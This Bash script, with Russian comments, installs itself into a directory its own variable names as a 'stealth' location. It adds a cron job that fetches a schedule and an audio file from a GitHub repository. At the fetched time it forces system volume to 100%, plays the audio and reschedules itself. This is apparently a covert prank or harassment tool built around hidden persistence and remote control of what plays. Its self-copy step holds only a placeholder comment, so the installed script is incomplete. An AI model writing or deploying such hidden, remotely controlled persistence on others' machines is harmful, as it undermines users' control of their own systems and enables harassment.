#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"
LOG_FILE="$HOME/audio_service.log"

# Функция логирования
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        if ! curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            log "Ошибка загрузки: $url"
            return 1
        fi
    elif command -v wget >/dev/null; then
        if ! wget -q --timeout=10 --tries=2 "$url" -O "$output"; then
            log "Ошибка загрузки: $url"
            return 1
        fi
    else
        log "Ошибка: Не найден curl или wget!"
        return 1
    fi
    
    if [[ ! -s "$output" ]]; then
        log "Файл пустой: $url"
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        fi
    fi
    
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция проверки и настройки окружения
setup_audio_environment() {
    # Экспортируем необходимые переменные окружения
    export XDG_RUNTIME_DIR="/run/user/$(id -u)"
    export PULSE_RUNTIME_PATH="$XDG_RUNTIME_DIR/pulse"
    
    # Добавляем пути к аудиоутилитам
    export PATH="$PATH:/usr/bin:/usr/local/bin"
    
    # Создаем runtime директорию если не существует
    mkdir -p "$XDG_RUNTIME_DIR"
    
    # Проверяем доступность аудиоутилит
    if ! command -v paplay >/dev/null && ! command -v aplay >/dev/null; then
        log "Ошибка: Не найдены аудиоутилиты (paplay, aplay)"
        return 1
    fi
    return 0
}

# Функция проверки времени
check_schedule() {
    local schedule_time=$(get_schedule_time)
    local current_time=$(date '+%H:%M')
    
    echo "Текущее время: $current_time"
    echo "Запланированное время: $schedule_time"
    
    # Проверяем crontab
    echo "Задачи в crontab:"
    crontab -l | grep -i audio_service || echo "Не найдено задач audio_service"
}

# Функция обновления cron
update_cron_job() {
    local schedule_time=$(get_schedule_time)
    local hour=$(echo "$schedule_time" | cut -d: -f1)
    local minute=$(echo "$schedule_time" | cut -d: -f2)
    
    # Удаляем старые записи
    crontab -l 2>/dev/null | grep -v "AUDIO_SERVICE_GH" | crontab -
    
    # Добавляем новую запись
    CRON_JOB="$minute $hour * * * export XDG_RUNTIME_DIR=/run/user/$(id -u) && export PULSE_RUNTIME_PATH=/run/user/$(id -u)/pulse && $STEALTH_DIR/audio_service.sh --play #AUDIO_SERVICE_GH"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    
    log "Установлено время: $schedule_time"
    echo "Установлено время: $schedule_time"
}

# Функция воспроизведения
play_audio() {
    log "Запуск воспроизведения"
    
    # Настраиваем окружение
    if ! setup_audio_environment; then
        log "Ошибка настройки аудиоокружения"
        return 1
    fi
    
    # Блокировка от параллельного выполнения
    exec 9>"$LOCK_FILE"
    if ! flock -n 9; then
        log "Обнаружена блокировка, пропускаем выполнение"
        return 0
    fi
    
    # Загружаем аудио с GitHub
    if ! download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        log "Не удалось загрузить аудио!"
        flock -u 9
        return 1
    fi
    
    log "Аудио загружено: $TEMP_AUDIO"
    
    # Управление громкостью
    if command -v pactl &>/dev/null; then
        ORIG_VOL=$(pactl get-sink-volume @DEFAULT_SINK@ | grep -oP '\d+%' | head -1)
        pactl set-sink-volume @DEFAULT_SINK@ 100%
        log "Громкость установлена на 100% (было: $ORIG_VOL)"
    fi
    
    # Воспроизведение
    local success=0
    if command -v ffmpeg &>/dev/null && command -v paplay &>/dev/null; then
        log "Воспроизведение через ffmpeg + paplay"
        if ffmpeg -loglevel quiet -i "$TEMP_AUDIO" -f wav - | paplay - 2>>"$LOG_FILE"; then
            success=1
        fi
    elif command -v paplay &>/dev/null; then
        log "Воспроизведение через paplay"
        if paplay "$TEMP_AUDIO" 2>>"$LOG_FILE"; then
            success=1
        fi
    elif command -v aplay &>/dev/null; then
        log "Воспроизведение через aplay"
        if aplay "$TEMP_AUDIO" 2>>"$LOG_FILE"; then
            success=1
        fi
    fi
    
    # Восстановление системы
    sleep 0.5
    if [[ -n "$ORIG_VOL" ]] && command -v pactl &>/dev/null; then
        pactl set-sink-volume @DEFAULT_SINK@ "$ORIG_VOL"
        log "Громкость восстановлена: $ORIG_VOL"
    fi
    
    rm -f "$TEMP_AUDIO"
    flock -u 9
    
    if [[ $success -eq 1 ]]; then
        log "✅ Аудио успешно воспроизведено"
        update_cron_job
    else
        log "❌ Не удалось воспроизвести аудио"
        echo -e "\a"  # Системный beep
    fi
}

# Функция установки
install_self() {
    mkdir -p "$STEALTH_DIR"
    
    # Сохраняем текущий скрипт в скрытую директорию
    cat > "$STEALTH_DIR/audio_service.sh" << 'EOF'
#!/bin/bash

# ... (вставить содержимое этой же самой функции install_self из предыдущего скрипта)
EOF

    chmod +x "$STEALTH_DIR/audio_service.sh"
    update_cron_job
    
    log "Скрипт установлен в $STEALTH_DIR/audio_service.sh"
    echo "Скрипт установлен. Лог: $LOG_FILE"
}

# Точка входа
case "${1:-}" in
    "--play")
        play_audio
        ;;
    "--check-time"|"--status")
        check_schedule
        ;;
    "--test")
        echo "Тестирование аудиосистемы..."
        setup_audio_environment
        play_audio
        ;;
    "--log")
        tail -f "$LOG_FILE"
        ;;
    *)
        install_self
        ;;
esac
